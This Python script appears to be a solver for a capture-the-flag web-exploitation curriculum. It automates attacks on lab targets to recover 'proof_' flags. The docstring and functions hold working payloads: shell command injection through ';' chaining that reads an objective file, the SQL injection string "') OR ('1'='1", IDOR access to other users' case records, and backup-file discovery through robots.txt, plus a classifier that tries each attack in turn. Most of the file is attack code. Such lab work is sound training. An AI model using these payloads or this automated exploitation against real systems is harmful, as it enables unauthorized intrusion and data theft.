#!/usr/bin/env python3
"""Shell Company (day-25 web-exploitation, curriculum day 16) — OS command
injection, plus a generic classifier for its cumulative mastery targets.

This family's own bug class: a Gin app's `/api/clues` discloses
`feature_route` (e.g. `/execute-<hex>` or `/process-<hex>`) and
`input_parameter` (observed: `path`) plus an `example_path` (observed:
`/app/static`). The route runs a shell command built by string-concatenating
the raw `path` value (looks like `ls -l <path>` under the hood - the normal
response is an `ls -l`-shaped directory listing) with NO shell-metacharacter
escaping: appending `; <anything>` to `path` runs `<anything>` as a second
command and its stdout is concatenated into the JSON `stdout` field. The
proof is not reflected directly - it has to be read from a file. The
container's own environment discloses the file: `env` (run via the same
injection) includes `OBJECTIVE_PATH=/run/huntress/objective.txt`; `cat` that
path and extract the `proof_<hex>` from stdout. (`$(...)`-style substitution
inside the query value was rejected by the server with
`{"error":"diagnostic_failed"}` on every target tried - always use plain
`;`-separated command chaining, never command substitution.)

Mastery is cumulative (see docs/web-worker-lessons.md): this family's own 4
live mastery targets turned out to be one of each of the following,
classified independently via root-page HTML / `/api/clues` shape, never by
assuming the family's own class:
  - backup exposure (day-19 class): root HTML crawler-policy comment ->
    robots.txt Disallow -> open directory index -> named .bak file -> proof
    in a JSON field.
  - IDOR (day-19 class): a dashboard ("Pocket SOC") sets a session cookie and
    shows the current user's own case ids; `GET /api/activity` (the "activity
    feed" link) leaks a foreign case id (`owner` != current user,
    `visibility: "reference_only"`); `GET /api/briefs/<foreign id>` with the
    same session/cookie has no ownership check and returns the proof in a
    `note` field.
  - SQL injection, group-closing boolean (day-19 class, "Archive Atlas" /
    "Query Me This" app design): a `/search?q=` form backed by a quoted LIKE
    clause; the exact payload `') OR ('1'='1` (reused verbatim from
    `day-19-web-exploitation/sqli/solve.py` and `day-24-web-exploitation/
    fetch-quest`) surfaces a `restricted`-pill record whose text holds the
    proof. Plain `' OR '1'='1` and comment-based (`--`, `#`) payloads do not
    work against this app shape - don't bother trying them first.
  - this family's own command injection (above).

Stdlib only. Talks only to the one target origin given on the command line.
Usage: python3 solve.py <target_base_url> [--all-classes]

With no flags, solves assuming the family's own command-injection class
(single_solve / time_trial shape). With --all-classes, runs the full
mastery-style classifier (tries clues/command-injection first, then backup
exposure, then IDOR, then SQLi) and returns the first proof found - use this
for an unclassified mastery target.
"""
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import http.cookiejar
from html.parser import HTMLParser

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
TIMEOUT = 20
DELAY = 0.7
PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")
# The server rejected $(...) command substitution outright; plain `;` chaining
# is the only form confirmed to work.
INJECTION_SUFFIX = "; cat $OBJECTIVE_PATH 2>/dev/null || cat /run/huntress/objective.txt"


class Links(HTMLParser):
    def __init__(self):
        super().__init__()
        self.hrefs = []

    def handle_starttag(self, tag, attrs):
        if tag == "a":
            for key, value in attrs:
                if key == "href" and value:
                    self.hrefs.append(value)


class Target:
    """Paced, cookie-jarred client scoped to exactly one target origin."""

    def __init__(self, base_url):
        self.base = base_url.rstrip("/")
        self._requests = 0
        self.cookiejar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cookiejar))

    def request(self, path, method="GET", params=None, headers=None):
        if self._requests:
            time.sleep(DELAY)
        self._requests += 1
        url = self.base + path
        if params:
            url += "?" + urllib.parse.urlencode(params)
        hdrs = {"User-Agent": UA}
        hdrs.update(headers or {})
        req = urllib.request.Request(url, headers=hdrs, method=method)
        try:
            with self.opener.open(req, timeout=TIMEOUT) as resp:
                return resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as err:
            return err.code, err.read().decode("utf-8", "replace")

    def get(self, path, params=None, headers=None):
        return self.request(path, "GET", params=params, headers=headers)

    def get_json(self, path, params=None, headers=None):
        status, body = self.get(path, params=params, headers=headers)
        try:
            return status, json.loads(body)
        except ValueError:
            return status, None


# --------------------------------------------------------------------- classes

def solve_command_injection(t):
    """This family's own bug: `/api/clues` -> feature_route/input_parameter/
    example_path on a Gin app that shells out to build a directory listing."""
    status, clues = t.get_json("/api/clues")
    if status != 200 or not clues:
        return None
    feature_route = clues.get("feature_route")
    param = clues.get("input_parameter", "path")
    example = clues.get("example_path", "/app/static")
    if not feature_route:
        return None
    status, body = t.get(feature_route, params={param: example + INJECTION_SUFFIX})
    match = PROOF_RE.search(body)
    return match.group(0) if match else None


def solve_backup_exposure(t):
    """robots.txt Disallow -> open directory index -> named backup file ->
    proof in a JSON field. No wordlists: every path comes from the previous
    response."""
    status, robots = t.get("/robots.txt")
    if status != 200:
        return None
    for d in re.findall(r"(?mi)^\s*Disallow:\s*(\S+)", robots):
        d = "/" + d.strip("/") + "/"
        status, index = t.get(d)
        if status != 200:
            continue
        parser = Links()
        parser.feed(index)
        members = [h for h in parser.hrefs if h.rstrip("/").split("/")[-1]]
        members.sort(key=lambda h: 0 if re.search(
            r"\.(bak|old|orig|save|swp|zip|tar|gz|sql|json|txt|env)(\.|$)", h, re.I) else 1)
        for href in members:
            path = href if href.startswith("/") else d + href
            status, body = t.get(path)
            if status != 200:
                continue
            match = PROOF_RE.search(body)
            if match:
                return match.group(0)
    return None


def solve_idor(t, html):
    """Dashboard links a per-id case page and an activity/feed API. The feed
    discloses a foreign case id (owner != current user, or
    visibility=reference_only); request that id's object API with the same
    session - no ownership check stops it."""
    feed = next(iter(re.findall(r'href="(/api/[^"]+)"', html)), None)
    case_links = re.findall(r'href="(/[a-z]+/\d+)"', html)
    if not feed or not case_links:
        return None
    my_ids = {int(link.rsplit("/", 1)[1]) for link in case_links}
    status, case_page = t.get(case_links[0])
    inline = re.search(r'fetch\(["\'](/api/[^"\']*?)(\d+)([^"\']*)["\']', case_page)
    api_template = (inline.group(1), inline.group(3)) if inline else None
    status, feed_body = t.get(feed)
    try:
        feed_json = json.loads(feed_body)
    except ValueError:
        return None
    me = feed_json.get("current_user")
    foreign_ids = []
    for event in feed_json.get("events", []):
        case_id = event.get("case_id") or event.get("id")
        if case_id is None:
            continue
        if (event.get("owner") and event.get("owner") != me) or \
                event.get("visibility") == "reference_only" or case_id not in my_ids:
            foreign_ids.append(case_id)

    def object_urls(case_id):
        if api_template:
            yield f"{api_template[0]}{case_id}{api_template[1]}"
        kind = case_links[0].rsplit("/", 2)[-2]
        yield f"/api/{kind}/{case_id}"

    for case_id in dict.fromkeys(foreign_ids):
        for url in dict.fromkeys(object_urls(case_id)):
            status, body = t.get(url)
            if status == 200:
                match = PROOF_RE.search(body)
                if match:
                    return match.group(0)
                break
    return None


def solve_sqli(t, html):
    """A `/search?q=` form backed by a quoted LIKE clause. The group-closing
    payload `') OR ('1'='1` (exact string reused from day-19/day-24 - plain
    `' OR '1'='1` and comment-based payloads do not work against this app
    shape) surfaces the hidden/restricted row carrying the proof."""
    action_match = re.search(r"<form[^>]*action=['\"]([^'\"]+)['\"]", html)
    name_match = re.search(r"<input[^>]*name=['\"]([^'\"]+)['\"]", html)
    if not action_match or not name_match:
        return None
    action, name = action_match.group(1), name_match.group(1)
    status, body = t.get(action, params={name: "') OR ('1'='1"})
    match = PROOF_RE.search(body)
    return match.group(0) if match else None


def classify_and_solve(base_url):
    t = Target(base_url)
    status, html = t.get("/")
    if status != 200:
        return None, "root request failed"

    proof = solve_command_injection(t)
    if proof:
        return proof, "command injection (this family's own class)"

    if re.search(r"crawler polic|robots", html, re.I):
        proof = solve_backup_exposure(t)
        if proof:
            return proof, "backup exposure"

    if re.search(r'href="(/api/[^"]+)"', html) and re.findall(r'href="(/[a-z]+/\d+)"', html):
        proof = solve_idor(t, html)
        if proof:
            return proof, "IDOR"

    if re.search(r"<form[^>]*action=['\"][^'\"]*search", html, re.I) or "<form" in html:
        proof = solve_sqli(t, html)
        if proof:
            return proof, "SQL injection (group-closing)"

    # last resorts, in case the html-based gates above missed a signal
    proof = solve_backup_exposure(t)
    if proof:
        return proof, "backup exposure (fallback)"
    proof = solve_idor(t, html)
    if proof:
        return proof, "IDOR (fallback)"

    return None, "unclassified"


def main():
    if len(sys.argv) < 2:
        print(f"usage: {sys.argv[0]} <target_base_url> [--all-classes]", file=sys.stderr)
        return 2
    base_url = sys.argv[1]
    if "--all-classes" in sys.argv[2:]:
        proof, classification = classify_and_solve(base_url)
    else:
        t = Target(base_url)
        proof = solve_command_injection(t)
        classification = "command injection"
    if not proof:
        print(f"no proof found (classification attempt: {classification})", file=sys.stderr)
        return 1
    print(f"classification={classification}")
    print(proof)
    return 0


if __name__ == "__main__":
    sys.exit(main())
